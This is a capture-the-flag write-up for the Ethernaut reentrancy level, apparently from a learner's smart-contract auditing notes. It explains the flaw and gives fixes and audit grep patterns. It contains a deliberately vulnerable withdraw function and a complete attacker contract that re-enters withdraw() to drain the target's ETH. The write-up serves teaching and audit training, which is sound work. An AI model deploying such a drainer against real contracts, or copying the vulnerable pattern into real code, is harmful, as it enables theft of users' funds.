# Level 10 — Reentrancy

## The Most Important Vulnerability in Smart Contract Security

This is the vulnerability that caused the DAO hack in 2016 — $60 million stolen, Ethereum hard-forked because of it. Every auditor must know this cold.

---

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");  // ← VULNERABLE
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;  // ← This runs AFTER the call
    }
  }

  receive() external payable {}
}
```

---

## Objective
Drain the contract of all ETH.

---

## Vulnerability

**Type:** Reentrancy  
**Severity:** Critical  
**SWC:** SWC-107

### What's Wrong — The Checks-Effects-Interactions Violation

The `withdraw()` function:
1. ✅ **Checks** — `if(balances[msg.sender] >= _amount)` — OK
2. ❌ **Interacts** — `msg.sender.call{value:_amount}("")` — sends ETH BEFORE updating balance
3. ❌ **Effects** — `balances[msg.sender] -= _amount` — balance updated TOO LATE

When the contract sends ETH to `msg.sender`, if `msg.sender` is a contract, its `receive()` function is triggered. That `receive()` can call `withdraw()` again — BEFORE the balance was updated.

The check `balances[msg.sender] >= _amount` passes again because the balance hasn't been zeroed yet. The attacker keeps re-entering until the contract is empty.

### Visualised

```
Attacker calls withdraw(1 ETH)
  → Contract checks: balance = 1 ETH ✓
  → Contract sends 1 ETH to attacker
    → Attacker receive() triggers
      → Attacker calls withdraw(1 ETH) again
        → Contract checks: balance STILL = 1 ETH ✓ (not updated yet!)
        → Contract sends 1 ETH again
          → repeat until contract empty
  → Contract updates balance to 0 (too late, already drained)
```

---

## Exploit

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttacker {
    IReentrance public target;
    uint public attackAmount;

    constructor(address _target) public {
        target = IReentrance(_target);
    }

    function attack() external payable {
        attackAmount = msg.value;
        // Step 1: Donate so we have a legitimate balance
        target.donate{value: msg.value}(address(this));
        // Step 2: Start the reentrancy loop
        target.withdraw(attackAmount);
    }

    // This triggers on every ETH receive — re-enters withdraw()
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    function collectProfit() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

---

## Foundry Exploit Test

See `foundry-exploits/test/ReentrancyExploit.t.sol`

```bash
forge test --match-test testReentrancyExploit -vvvv
```

---

## Fix

### Option 1 — Checks-Effects-Interactions Pattern (CEI)

```solidity
function withdraw(uint _amount) public {
    // 1. CHECK
    require(balances[msg.sender] >= _amount, "Insufficient balance");
    // 2. EFFECT — update state BEFORE external call
    balances[msg.sender] -= _amount;
    // 3. INTERACT — external call last
    (bool result,) = msg.sender.call{value: _amount}("");
    require(result, "Transfer failed");
}
```

### Option 2 — ReentrancyGuard (OpenZeppelin)

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Reentrance is ReentrancyGuard {
    function withdraw(uint _amount) public nonReentrant {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] -= _amount;
        (bool result,) = msg.sender.call{value: _amount}("");
        require(result);
    }
}
```

---

## Key Lesson

> **CEI Pattern — Checks, Effects, Interactions.** Always update contract state BEFORE making external calls. Any external call (`.call()`, `.transfer()`, `.send()`, calling another contract) can trigger arbitrary code execution.

**In audits: search for any `.call{value:}` or ETH transfer where state is updated AFTER the call. That's your reentrancy candidate.**

### Audit Grep Pattern
```bash
# Find potential reentrancy — external calls before state updates
grep -n "\.call{value" contracts/*.sol
grep -n "\.transfer(" contracts/*.sol
grep -n "\.send(" contracts/*.sol
```

---

## Real World Examples
- **The DAO Hack (2016)** — $60M stolen, Ethereum hard fork
- **Lendf.me (2020)** — $25M stolen
- **Cream Finance (2021)** — $18.8M stolen

---

## Status
- [x] Solved on Ethernaut
- [x] Attack contract written
- [x] Foundry exploit written and passing
- [x] Added to GitHub
